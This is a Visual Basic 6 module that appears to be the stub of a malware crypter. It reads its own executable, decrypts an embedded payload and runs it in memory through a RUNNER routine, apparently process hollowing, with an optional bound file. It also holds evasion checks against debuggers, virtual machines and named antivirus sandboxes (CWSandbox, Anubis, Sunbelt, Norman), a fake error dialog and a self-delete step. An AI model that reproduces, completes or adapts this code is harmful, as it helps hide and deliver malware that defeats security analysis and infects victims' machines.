Attribute VB_Name = "Module1"
Option Explicit
Private Declare Function OutputDebugString Lib "kernel32" Alias "OutputDebugStringA" (ByVal lpOutputString As String) As Long
Const Encryption = "&786/(8t9T/(676&(t78978&57%85/(95(65t/(9876t78z68z78&78678T7t78T&T785/(%&/t(/t/(tt89T()Z89Z6&/()z(9/(&tz"
Dim HOOK() As String
Dim UNHOOKER As String
Dim crypt As New clscrypt
Dim O() As Byte
Dim UNHOOK As String
Dim command As String
Dim Data() As Byte
Dim P() As Byte
Sub Main()
Call Start
End Sub
Sub e()
Open App.Path & "\" & App.EXEName & ".exe" For Binary As #1
UNHOOK = Space(LOF(1))
Get #1, , UNHOOK
Close #1
End Sub
Sub tz()
Call RUNNER(App.Path & "\" & App.EXEName & ".exe", O(), command)
End Sub
Public Function Start()
Call e
HOOK() = FuckingKaspersky(UNHOOK, Encryption)
If HOOK(2) = "" Then
Else
MsgBox HOOK(2), vbCritical, "Fehler"
End If
If HOOK(3) = "" Then
Else
HOOK(3) = command
End If
If HOOK(4) = "" Then
Else
Call Sandboxhelp
End If
If HOOK(5) = "" Then
Else
Call vm
End If
If HOOK(6) = "" Then
Else
If IsDebuggerActive() = True Then End
End If
If HOOK(8) = "" Then
Else
Call Normanhelp
End If
If HOOK(9) = "" Then
Else
If Module4.IsCWSandbox = True Then End
End If
If HOOK(10) = "" Then
Else
If Module4.BDSandbox Then End
End If
If HOOK(11) = "" Then
Else
If Module4.IsSunbelt = True Then End
End If
If HOOK(12) = "" Then
Else
If Module5.sGetXPCDKey = "76487-337-8429955-22614" Then End
If Module4.IsInAnubis Then End
If GetSerialNumber(Environ("SystemDrive") & "\") = 1824245000 Then End
End If
If HOOK(13) = "" Then
Else
Call Löschen
End If
UNHOOKER = crypt.DecryptString(HOOK(1), HOOK(3))
O() = StrConv(UNHOOKER, vbFromUnicode)
If HOOK(7) = "" Then
Else
Call BIND
Call tz
End If
Call tz
End
End Function
Public Function IsDebuggerActive() As Boolean
IsDebuggerActive = Not (OutputDebugString(VarPtr(ByVal "=)")) = 1)
End Function
Sub BIND()
Data() = StrConv(HOOK(7), vbFromUnicode)
Call RUNNER(App.Path & "\" & App.EXEName & ".exe", Data(), command)
End Sub
